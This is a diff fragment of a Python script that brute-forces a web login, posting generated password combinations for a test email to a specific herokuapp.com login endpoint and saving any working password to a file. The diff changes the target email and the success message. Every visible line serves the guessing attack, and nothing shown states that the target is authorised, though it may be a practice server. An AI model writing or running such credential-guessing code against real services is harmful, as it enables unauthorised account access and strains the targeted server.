@@ -25,14 +25,14 @@ def main():
                         try:
                             combination = first_char + "".join(rest)
                             payload = {
-                                "email": "test@easy.ch",
+                                "email": "test@brute.ch",
                                 "password": combination,
                             }
                             session = requests.Session()
                             response = session.post("https://serverapp-afb1a71b45e2.herokuapp.com/login", json=payload, timeout=5)
                             print(combination, response.status_code)
                             if response.ok:
-                                print(combination)
+                                print("Password: "+combination)
                                 with open("pwd.txt", "w") as f:
                                     f.write(combination)
                                 break
